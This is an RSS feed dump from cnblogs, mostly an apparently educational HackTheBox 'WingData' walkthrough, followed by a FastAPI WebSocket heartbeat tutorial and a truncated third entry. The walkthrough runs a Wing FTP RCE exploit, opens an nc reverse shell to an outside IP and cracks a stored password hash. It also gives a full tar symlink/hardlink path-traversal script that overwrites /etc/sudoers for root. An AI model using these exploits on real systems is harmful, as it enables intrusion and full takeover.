{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "【渗透测试】HTB靶场之WingData 全过程wp",
      "link": "https://www.cnblogs.com/DSchenzi/p/19625276",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/DSchenzi/p/19625276\" id=\"cb_post_title_url\" title=\"发布于 2026-02-19 20:05\">\n    <span>【渗透测试】HTB靶场之WingData 全过程wp</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"wingdata\">WingData</h1>\n<h2 id=\"信息收集\">信息收集</h2>\n<p><img alt=\"image-20260219182401835\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200443486-1691206510.png\" /></p>\n<p><img alt=\"image-20260219182537800\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200444147-1082259586.png\" /></p>\n<p>得到一个ftp.wingdata.htb，也将这个加上</p>\n<p><img alt=\"image-20260219182636761\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200444607-2041651593.png\" /></p>\n<p>Wing FTP Server v7.4.3</p>\n<p>通过搜寻cve是 CVE-2025-47812</p>\n<h2 id=\"漏洞利用cve-2025-47812\">漏洞利用（CVE-2025-47812）</h2>\n<p><a href=\"https://github.com/4m3rr0r/CVE-2025-47812-poc\" rel=\"noopener nofollow\" target=\"_blank\">4m3rr0r/CVE-2025-47812-poc: Wing FTP Server Remote Code Execution (RCE) Exploit (CVE-2025-47812)</a></p>\n<pre><code class=\"language-kotlin\">python CVE-2025-47812.py -u http://ftp.wingdata.htb -c \"whoami\" -v\n</code></pre>\n<p><img alt=\"image-20260219183211504\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200444925-1620471614.png\" /></p>\n<p><strong>然后反弹shell</strong></p>\n<pre><code class=\"language-kotlin\">python CVE-2025-47812.py -u http://ftp.wingdata.htb -c \"nc 10.10.16.5 8888 -e /bin/sh\" -v\n\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre>\n<p><img alt=\"image-20260219183719631\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200445289-1452625655.png\" /></p>\n<p>然后在<code>/opt/wftpserver/Data/1/users</code>下的wacky.xml获得用户加密凭据</p>\n<p><img alt=\"image-20260219184040177\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200445708-1521256185.png\" /></p>\n<pre><code>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP\n</code></pre>\n<p><strong>爆破hash(WingFTP 使用SHA256算法，并使用盐值“WingFTP”为加密方式)</strong></p>\n<pre><code class=\"language-kotlin\">hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre>\n<p><img alt=\"image-20260219184927089\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446045-1809595022.png\" /></p>\n<p>得到密码<code>!#7Blushing^*Bride5</code></p>\n<p>wacky/c</p>\n<p><strong>然后ssh连接</strong></p>\n<p><img alt=\"image-20260219185219510\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446347-1318255688.png\" /></p>\n<p>得到user.txt</p>\n<h2 id=\"权限提升\">权限提升</h2>\n<p>先sudo -l看一下</p>\n<p><img alt=\"image-20260219185311322\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446644-1829574816.png\" /></p>\n<p>可以看到有一个py脚本</p>\n<p>我们去看一下</p>\n<pre><code>cat /opt/backup_clients/restore_backup_clients.py\n</code></pre>\n<pre><code class=\"language-python\">#!/usr/bin/env python3\nimport tarfile\nimport os\nimport sys\nimport re\nimport argparse\n\nBACKUP_BASE_DIR = \"/opt/backup_clients/backups\"\nSTAGING_BASE = \"/opt/backup_clients/restored_backups\"\n\ndef validate_backup_name(filename):\n    if not re.fullmatch(r\"^backup_\\d+\\.tar$\", filename):\n        return False\n    client_id = filename.split('_')[1].rstrip('.tar')\n    return client_id.isdigit() and client_id != \"0\"\n\ndef validate_restore_tag(tag):\n    return bool(re.fullmatch(r\"^[a-zA-Z0-9_]{1,24}$\", tag))\n\ndef main():\n    parser = argparse.ArgumentParser(\n        description=\"Restore client configuration from a validated backup tarball.\",\n        epilog=\"Example: sudo %(prog)s -b backup_1001.tar -r restore_john\"\n    )\n    parser.add_argument(\n        \"-b\", \"--backup\",\n        required=True,\n        help=\"Backup filename (must be in /home/wacky/backup_clients/ and match backup_&lt;client_id&gt;.tar, \"\n             \"where &lt;client_id&gt; is a positive integer, e.g., backup_1001.tar)\"\n    )\n    parser.add_argument(\n        \"-r\", \"--restore-dir\",\n        required=True,\n        help=\"Staging directory name for the restore operation. \"\n             \"Must follow the format: restore_&lt;client_user&gt; (e.g., restore_john). \"\n             \"Only alphanumeric characters and underscores are allowed in the &lt;client_user&gt; part (1–24 characters).\"\n    )\n\n    args = parser.parse_args()\n\n    if not validate_backup_name(args.backup):\n        print(\"[!] Invalid backup name. Expected format: backup_&lt;client_id&gt;.tar (e.g., backup_1001.tar)\", file=sys.stderr)\n        sys.exit(1)\n\n    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)\n    if not os.path.isfile(backup_path):\n        print(f\"[!] Backup file not found: {backup_path}\", file=sys.stderr)\n        sys.exit(1)\n\n    if not args.restore_dir.startswith(\"restore_\"):\n        print(\"[!] --restore-dir must start with 'restore_'\", file=sys.stderr)\n        sys.exit(1)\n\n    tag = args.restore_dir[8:]\n    if not tag:\n        print(\"[!] --restore-dir must include a non-empty tag after 'restore_'\", file=sys.stderr)\n        sys.exit(1)\n\n    if not validate_restore_tag(tag):\n        print(\"[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores\", file=sys.stderr)\n        sys.exit(1)\n\n    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)\n    print(f\"[+] Backup: {args.backup}\")\n    print(f\"[+] Staging directory: {staging_dir}\")\n\n    os.makedirs(staging_dir, exist_ok=True)\n\n    try:\n        with tarfile.open(backup_path, \"r\") as tar:\n            tar.extractall(path=staging_dir, filter=\"data\")\n        print(f\"[+] Extraction completed in {staging_dir}\")\n    except (tarfile.TarError, OSError, Exception) as e:\n        print(f\"[!] Error during extraction: {e}\", file=sys.stderr)\n        sys.exit(2)\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>\n<p>我们利用这个脚本生成tar文件</p>\n<pre><code class=\"language-python\">#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\n生成恶意tar文件的漏洞利用脚本\n作用：构造包含多层目录、符号链接的tar文件，尝试突破路径限制写入/etc/sudoers\n\"\"\"\n\nimport tarfile\nimport os\nimport io\nimport sys\n\ndef create_malicious_tar(output_path=\"/tmp/backup_9999.tar\"):\n    \"\"\"\n    创建恶意tar文件，包含路径遍历和符号链接的构造\n    \n    Args:\n        output_path: 生成的tar文件保存路径，默认/tmp/backup_9999.tar\n    \"\"\"\n    # 构造长目录名（247个d），用于突破路径长度限制\n    long_dir_name = 'd' * 247\n    # 用于构造多层目录的字符序列\n    step_chars = \"abcdefghijklmnop\"\n    current_path = \"\"\n\n    try:\n        # 以写模式打开tar文件\n        with tarfile.open(output_path, mode=\"w\") as tar:\n            # 循环构造多层目录和符号链接\n            for char in step_chars:\n                # 1. 创建长目录名的目录项\n                dir_info = tarfile.TarInfo(os.path.join(current_path, long_dir_name))\n                dir_info.type = tarfile.DIRTYPE  # 标记为目录类型\n                tar.addfile(dir_info)\n\n                # 2. 创建指向该长目录的符号链接\n                symlink_info = tarfile.TarInfo(os.path.join(current_path, char))\n                symlink_info.type = tarfile.SYMTYPE  # 标记为符号链接类型\n                symlink_info.linkname = long_dir_name  # 链接指向长目录\n                tar.addfile(symlink_info)\n\n                # 更新当前路径，进入下一层\n                current_path = os.path.join(current_path, long_dir_name)\n\n            # 3. 构造多层符号链接路径，用于路径遍历\n            link_path = os.path.join(\"/\".join(step_chars), \"l\"*254)\n            link_info = tarfile.TarInfo(link_path)\n            link_info.type = tarfile.SYMTYPE\n            link_info.linkname = \"../\" * len(step_chars)  # 构造回退路径\n            tar.addfile(link_info)\n\n            # 4. 创建指向/etc目录的符号链接（escape）\n            escape_info = tarfile.TarInfo(\"escape\")\n            escape_info.type = tarfile.SYMTYPE\n            escape_info.linkname = f\"{link_path}/../../../../../../../etc\"\n            tar.addfile(escape_info)\n\n            # 5. 创建指向/etc/sudoers的硬链接（sudoers_link）\n            sudoers_link_info = tarfile.TarInfo(\"sudoers_link\")\n            sudoers_link_info.type = tarfile.LNKTYPE\n            sudoers_link_info.linkname = \"escape/sudoers\"\n            tar.addfile(sudoers_link_info)\n\n            # 6. 写入恶意内容到sudoers_link（覆盖/etc/sudoers）\n            malicious_content = b\"wacky ALL=(ALL) NOPASSWD: ALL\\n\"\n            file_info = tarfile.TarInfo(\"sudoers_link\")\n            file_info.type = tarfile.REGTYPE  # 标记为普通文件类型\n            file_info.size = len(malicious_content)  # 指定文件大小\n            # 将内容写入tar文件\n            tar.addfile(file_info, fileobj=io.BytesIO(malicious_content))\n\n        print(f\"[+] 恶意tar文件已生成：{output_path}\")\n    except Exception as e:\n        print(f\"[!] 生成tar文件失败：{str(e)}\", file=sys.stderr)\n        sys.exit(1)\n\nif __name__ == \"__main__\":\n    # 支持自定义输出路径（可选参数）\n    if len(sys.argv) &gt; 1:\n        output_tar = sys.argv[1]\n    else:\n        output_tar = \"/tmp/backup_9999.tar\"\n    \n    create_malicious_tar(output_tar)\n</code></pre>\n<p><img alt=\"image-20260219194852389\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446994-1384173239.png\" /></p>\n<p>复制这个恶意的tar文件到sudo权限的目录下</p>\n<pre><code class=\"language-kotlin\">cp backup_9999.tar /opt/backup_clients/backups/\n</code></pre>\n<p>然后运行这个sudo脚本</p>\n<pre><code class=\"language-kotlin\">sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_evil\n</code></pre>\n<p><img alt=\"image-20260219195503275\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200447328-614892323.png\" /></p>\n<p>这时候再去sudo</p>\n<p><img alt=\"image-20260219200000270\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200447643-1483399691.png\" /></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 20:05</span>&nbsp;\n<a href=\"https://www.cnblogs.com/DSchenzi\">dynasty_chenzi</a>&nbsp;\n阅读(<span id=\"post_view_count\">5</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "FastAPI实战：WebSocket长连接保持与心跳机制，从入门到填坑",
      "link": "https://www.cnblogs.com/ymtianyu/p/19625144",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/ymtianyu/p/19625144\" id=\"cb_post_title_url\" title=\"发布于 2026-02-19 17:05\">\n    <span>FastAPI实战：WebSocket长连接保持与心跳机制，从入门到填坑</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        本文通过实战案例，详细讲解FastAPI与JavaScript实现WebSocket长连接保持的心跳机制，包括前后端代码、参数调优和常见陷阱，帮助你打造稳定可靠的双向通信。\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<div style=\"margin: 0 auto;\">\n<p style=\"font-size: 16px; color: rgba(93, 109, 126, 1); background-color: rgba(248, 249, 250, 1); padding: 12px 16px; border-radius: 8px; margin: 20px 0;\">📌 摘要：本文通过一个真实的上线案例，详细讲解FastAPI与JavaScript实现WebSocket长连接保持的心跳机制。你会了解为什么连接会断、心跳原理是什么、前后端代码怎么写，以及那些文档里没写的调优陷阱。照着做，让你的实时通信稳如老狗。</p>\n\n<p style=\"font-size: 16px; margin: 20px 0;\">你是不是也遇到过——WebSocket连接动不动就断开，尤其是在移动端，用户切换个Wi-Fi或者电梯里信号晃一下，消息就收不到了？📱 用户投诉说“APP消息延迟”，你一查日志，满屏都是<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">WebSocket disconnected</code>，然后疯狂重连，服务器压力山大，用户体验稀碎。</p>\n<p style=\"font-size: 16px; margin: 20px 0;\">有些项目图省事，觉得WebSocket连上就行了，结果线上跑了半天，运维小哥就发来报警：连接数忽高忽低，很多连接存活不到2分钟。查日志，好家伙，Nginx默认<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">proxy_read_timeout</code> 60秒，加上移动网络运营商会掐掉长时间无流量的连接，双向夹击，连接全断了。😭</p>\n<p style=\"font-size: 16px; margin: 20px 0;\"><strong style=\"color: rgba(186, 55, 42, 1);\">核心结论：</strong>WebSocket长连接保持，不能靠“连上就不管”，必须引入心跳机制——就像两个人打电话，每隔一会儿问一句“喂，还在吗？”。今天我就把FastAPI后端 + JavaScript前端的完整心跳实现，掰开了揉碎了讲给你听，顺便把我踩过的坑标红。</p>\n\n<div style=\"background-color: rgba(240, 247, 255, 1); padding: 16px; border-radius: 8px; margin: 25px 0;\">\n<p style=\"font-size: 18px; font-weight: 600; margin: 0 0 10px;\">🚦 本文路线图</p>\n<div style=\"margin-left: 8px;\">\n<p style=\"margin: 6px 0;\">🔹 为什么WebSocket会断？—— 中间件超时、网络状态变化</p>\n<p style=\"margin: 6px 0;\">🔹 心跳原理：ping-pong 还是 pong-ping？</p>\n<p style=\"margin: 6px 0;\">🔹 FastAPI后端：接收心跳消息 + 超时管理</p>\n<p style=\"margin: 6px 0;\">🔹 JavaScript前端：定时发送心跳 + 断线重连</p>\n<p style=\"margin: 6px 0;\">🔹 完整可运行代码示例</p>\n<p style=\"margin: 6px 0;\">🔹 那些年我踩过的坑（间隔设置、重复定时器、服务端主动断开）</p>\n</div>\n</div>\n<h2 style=\"font-size: 22px; font-weight: 600; margin: 30px 0 15px; padding-bottom: 6px;\">🧠 第一部分：连接为什么会断？</h2>\n<p style=\"font-size: 16px; margin: 20px 0;\">把WebSocket想象成一条水管，数据就是水。如果水管一直流水，它就不会堵。但要是你半天不放水，中间的路由器、防火墙就觉得“嘿，这管子是不是废弃了？”——<strong style=\"color: rgba(186, 55, 42, 1);\">咔嚓一刀给你掐了</strong>。尤其是在移动网络下，运营商的NAT网关空闲超时可能只有30秒到几分钟。还有我们常用的Nginx，默认<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">proxy_read_timeout</code>是60秒，一旦60秒内没有数据从后端发到客户端，Nginx就会自作主张断开连接。</p>\n<p style=\"font-size: 16px; margin: 20px 0;\">所以，要想让连接长存，唯一的方法就是<strong style=\"color: rgba(186, 55, 42, 1);\">定期发送一些“无用”的数据</strong>，告诉中间件：“我还活着，别砍我！”——这就是心跳。</p>\n<h2 style=\"font-size: 22px; font-weight: 600; margin: 30px 0 15px; padding-bottom: 6px;\">💓 第二部分：心跳机制的两种姿势</h2>\n<p style=\"font-size: 16px; margin: 20px 0;\">心跳本质是一种<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">ping/pong</code>模式。WebSocket协议本身有控制帧<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">Ping</code>和<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">Pong</code>，但浏览器原生JS的WebSocket API并没有直接暴露发送Ping帧的方法，所以我们一般用普通消息模拟：</p>\n<div style=\"margin-left: 8px;\">\n<p style=\"margin: 6px 0;\">✨ 方案A：客户端定时发送<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">ping</code>消息，服务器收到后立即回复<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">pong</code>。</p>\n<p style=\"margin: 6px 0;\">✨ 方案B：服务器定时发送<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">ping</code>，客户端回复<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">pong</code>。但同样，客户端需要能解析并回复。</p>\n</div>\n<p style=\"font-size: 16px; margin: 20px 0;\">更常见的做法是<strong style=\"color: rgba(186, 55, 42, 1);\">客户端主动发心跳，服务器只需响应或记录</strong>。为啥？因为客户端更能感知网络变化，且断开后能立即重连。下面我就以客户端发心跳为例，上代码。</p>\n<h2 style=\"font-size: 22px; font-weight: 600; margin: 30px 0 15px; padding-bottom: 6px;\">⚙️ 第三部分：FastAPI后端实战</h2>\n<p style=\"font-size: 16px; margin: 20px 0;\">先搭一个最简单的FastAPI WebSocket端点。这里我用了<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">/ws</code>路径，接收心跳消息（约定JSON格式<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">{\"type\": \"ping\"}</code>），并回复<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">{\"type\": \"pong\"}</code>。同时，为了及时清理死连接，我会记录每个连接的最后心跳时间，启动一个后台任务检查超时（比如60秒没收到心跳就主动close）。</p>\n<pre class=\"language-python highlighter-hljs\"><code>from fastapi import FastAPI, WebSocket, WebSocketDisconnect\nimport asyncio\nimport json\nfrom datetime import datetime, timedelta\n\napp = FastAPI()\n\nclass ConnectionManager:\n    def __init__(self):\n        self.active_connections: dict[WebSocket, datetime] = {}\n        self._heartbeat_check_interval = 30   # 每30秒检查一次\n        asyncio.create_task(self.heartbeat_checker())\n\n    async def connect(self, websocket: WebSocket):\n        await websocket.accept()\n        self.active_connections[websocket] = datetime.utcnow()\n        print(f\"新连接加入，当前连接数：{len(self.active_connections)}\")\n\n    def disconnect(self, websocket: WebSocket):\n        if websocket in self.active_connections:\n            del self.active_connections[websocket]\n            print(f\"连接断开，当前连接数：{len(self.active_connections)}\")\n\n    async def handle_messages(self, websocket: WebSocket):\n        try:\n            while True:\n                data = await websocket.receive_text()\n                try:\n                    msg = json.loads(data)\n                except:\n                    continue\n                # 如果是心跳ping，更新最后心跳时间并回复pong\n                if msg.get(\"type\") == \"ping\":\n                    self.active_connections[websocket] = datetime.utcnow()\n                    await websocket.send_text(json.dumps({\"type\": \"pong\"}))\n                else:\n                    # 其他业务消息，按需处理\n                    await websocket.send_text(json.dumps({\"type\": \"echo\", \"data\": msg}))\n        except WebSocketDisconnect:\n            self.disconnect(websocket)\n\n    async def heartbeat_checker(self):\n        while True:\n            await asyncio.sleep(self._heartbeat_check_interval)\n            now = datetime.utcnow()\n            timeout = timedelta(seconds=70)  # 超过70秒没心跳就断开\n            dead_conns = []\n            for ws, last_ping in self.active_connections.items():\n                if now - last_ping &gt; timeout:\n                    dead_conns.append(ws)\n            for ws in dead_conns:\n                try:\n                    await ws.close(code=1000, reason=\"heartbeat timeout\")\n                except:\n                    pass\n                self.disconnect(ws)\n\nmanager = ConnectionManager()\n\n@app.websocket(\"/ws\")\nasync def websocket_endpoint(websocket: WebSocket):\n    await manager.connect(websocket)\n    await manager.handle_messages(websocket)</code></pre>\n<p style=\"font-size: 16px; margin: 20px 0;\"><strong style=\"color: rgba(186, 55, 42, 1);\">🔔 重点说明：</strong> <span style=\"display: block; margin-left: 16px; margin-top: 6px;\">- <code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">handle_messages</code>里只处理心跳，其他业务消息可以自定义。</span> <span style=\"display: block; margin-left: 16px;\">- 后台心跳检查线程每30秒跑一次，如果某连接超过70秒没收到心跳，就主动关闭。这个70秒一定要大于客户端的心跳间隔（比如客户端30秒发一次，那70秒大概漏掉2次都没回复才断，防止网络抖动误杀）。</span> <span style=\"display: block; margin-left: 16px;\">- 注意<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">WebSocketDisconnect</code>的捕获，及时清理字典，避免内存泄漏。</span></p>\n<h2 style=\"font-size: 22px; font-weight: 600; margin: 30px 0 15px; padding-bottom: 6px;\">💻 第四部分：JavaScript前端实现</h2>\n<p style=\"font-size: 16px; margin: 20px 0;\">前端主要做三件事：建立连接、定时发心跳、监听断开自动重连。我习惯把WebSocket封装成一个类，方便复用。直接上代码：</p>\n<pre class=\"language-javascript highlighter-hljs\"><code>class WebSocketClient {\n    constructor(url) {\n        this.url = url;\n        this.ws = null;\n        this.heartbeatInterval = 30000; // 30秒一次心跳\n        this.reconnectInterval = 3000;   // 断线后3秒重连\n        this.heartbeatTimer = null;\n        this.reconnectTimer = null;\n        this.connect();\n    }\n\n    connect() {\n        this.ws = new WebSocket(this.url);\n        this.ws.onopen = () =&gt; {\n            console.log('WebSocket 已连接');\n            // 连接成功后，启动心跳\n            this.startHeartbeat();\n            // 如果之前有重连定时器，清掉\n            if (this.reconnectTimer) {\n                clearTimeout(this.reconnectTimer);\n                this.reconnectTimer = null;\n            }\n        };\n\n        this.ws.onmessage = (event) =&gt; {\n            const data = JSON.parse(event.data);\n            if (data.type === 'pong') {\n                console.log('收到心跳pong，连接正常');\n                // 可以在这里更新UI显示最后心跳时间，但不必须\n            } else {\n                // 处理其他业务消息\n                console.log('业务消息', data);\n            }\n        };\n\n        this.ws.onclose = (e) =&gt; {\n            console.log('WebSocket 关闭', e.reason);\n            // 停止心跳\n            this.stopHeartbeat();\n            // 尝试重连\n            this.reconnect();\n        };\n\n        this.ws.onerror = (err) =&gt; {\n            console.error('WebSocket 错误', err);\n            this.ws.close();\n        };\n    }\n\n    startHeartbeat() {\n        this.heartbeatTimer = setInterval(() =&gt; {\n            if (this.ws &amp;&amp; this.ws.readyState === WebSocket.OPEN) {\n                this.ws.send(JSON.stringify({ type: 'ping' }));\n                console.log('发送心跳ping');\n            } else {\n                console.warn('连接未开启，停止发送心跳');\n                this.stopHeartbeat();\n            }\n        }, this.heartbeatInterval);\n    }\n\n    stopHeartbeat() {\n        if (this.heartbeatTimer) {\n            clearInterval(this.heartbeatTimer);\n            this.heartbeatTimer = null;\n        }\n    }\n\n    reconnect() {\n        this.stopHeartbeat();\n        if (!this.reconnectTimer) {\n            this.reconnectTimer = setTimeout(() =&gt; {\n                console.log('尝试重连...');\n                this.connect();\n            }, this.reconnectInterval);\n        }\n    }\n\n    // 主动关闭连接（比如页面卸载时）\n    close() {\n        this.stopHeartbeat();\n        if (this.ws) {\n            this.ws.close();\n        }\n    }\n}\n\n// 使用示例\nconst client = new WebSocketClient('ws://你的域名/ws');\n// 页面关闭前主动清理\nwindow.addEventListener('beforeunload', () =&gt; client.close());</code></pre>\n<p style=\"font-size: 16px; margin: 20px 0;\"><strong style=\"color: rgba(186, 55, 42, 1);\">⚠️ 关键细节：</strong> <span style=\"display: block; margin-left: 16px; margin-top: 6px;\">- 心跳间隔不要超过Nginx的<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">proxy_read_timeout</code>，一般设30秒比较安全。</span> <span style=\"display: block; margin-left: 16px;\">- 断线重连要防抖：通过<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">reconnectTimer</code>避免重复重连。</span> <span style=\"display: block; margin-left: 16px;\">- 页面关闭时一定要<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">close</code>连接，否则服务端可能保留孤儿连接直到超时。</span></p>\n<h2 style=\"font-size: 22px; font-weight: 600; margin: 30px 0 15px; padding-bottom: 6px;\">🧪 第五部分：跑起来看看效果</h2>\n<p style=\"font-size: 16px; margin: 20px 0;\">启动FastAPI（<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">uvicorn main:app --reload</code>），打开浏览器控制台，你会看到每隔30秒发送一次ping，服务器立即回复pong。即使你断开Wi-Fi再打开，客户端也会自动重连，并且重连后心跳继续。🎯</p>\n<h2 style=\"font-size: 22px; font-weight: 600; margin: 30px 0 15px; padding-bottom: 6px;\">💣 第六部分：那些年我踩过的坑（必看）</h2>\n<div style=\"margin-left: 8px;\">\n<p style=\"margin: 6px 0;\"><strong style=\"color: rgba(186, 55, 42, 1);\">坑1：心跳间隔太短，服务器压力大</strong> —— 1秒一次纯属自残，30秒一次足够，既保活又省资源。</p>\n<p style=\"margin: 6px 0;\"><strong style=\"color: rgba(186, 55, 42, 1);\">坑2：服务端没做超时主动断开</strong> —— 客户端突然掉线（比如用户强制杀进程），服务端不知道，连接一直占着内存。所以后台心跳检查一定要有，超时就close。</p>\n<p style=\"margin: 6px 0;\"><strong style=\"color: rgba(186, 55, 42, 1);\">坑3：重连时忘记清理旧定时器</strong> —— 每次重连都新建一个<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">setInterval</code>，导致多个心跳线程并发，消息爆炸。解决方案：重连前先<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">stopHeartbeat()</code>。</p>\n<p style=\"margin: 6px 0;\"><strong style=\"color: rgba(186, 55, 42, 1);\">坑4：前后端心跳格式约定不一致</strong> —— 我用的是<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">{\"type\":\"ping\"}</code>，如果你后端用字段<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">heartbeat</code>，一定记得对齐，否则服务器不认，相当于没心跳。</p>\n<p style=\"margin: 6px 0;\"><strong style=\"color: rgba(186, 55, 42, 1);\">坑5：没考虑SSL/加密连接</strong> —— 生产环境用<span style=\"color: rgba(186, 55, 42, 1);\"><code>wss://</code></span>，证书配置要正确，否则连接直接被拒绝。</p>\n</div>\n<p style=\"font-size: 16px; margin: 20px 0;\">另外，如果你想更优雅一点，可以结合<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">asyncio.timeout</code>或者<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">websocket.receive()</code>的超时参数，不过我觉得上面这种“记录最后心跳+后台检查”的模式最清晰。</p>\n<h2 style=\"font-size: 22px; font-weight: 600; margin: 30px 0 15px; padding-bottom: 6px;\">📌 最后啰嗦一句</h2>\n<p style=\"font-size: 16px; margin: 20px 0;\">心跳机制不是银弹，但它确实是WebSocket长连接保持最简单有效的办法。结合断线重连，能让你的实时应用在恶劣网络环境下依然坚挺。如果你在生产环境还有更高要求，比如集群下的连接状态同步、心跳与业务消息优先级，欢迎留言交流。</p>\n<hr />\n<p style=\"font-size: 18px; font-weight: 500; color: rgba(44, 62, 80, 1); margin-bottom: 10px;\">老朋友提醒 👋</p>\n<p style=\"font-size: 16px; margin: 10px 0;\">这篇文章里的代码我都是用血泪教训换来的，现在直接抄就能跑。但你的业务场景可能不一样，比如心跳间隔是否需要动态调整？服务端要不要主动ping？欢迎在评论区分享你的“奇葩”踩坑经历，或者收藏起来，下次上线前翻出来看一眼，也许能帮你省下一个通宵。</p>\n<p style=\"font-size: 16px; margin: 30px 0 10px;\"><strong style=\"color: rgba(186, 55, 42, 1);\">如果你觉得有用，点赞或分享给团队，下次遇到WebSocket断连问题，咱们就不再慌了。😎</strong></p>\n</div>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 17:05</span>&nbsp;\n<a href=\"https://www.cnblogs.com/ymtianyu\">一名程序媛呀</a>&nbsp;\n阅读(<span id=\"post_view_count\">6</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "2023年电赛国赛经历",
      "link": "https://www.cnblogs.com/badboy02/p/19623709",
      "published": "",
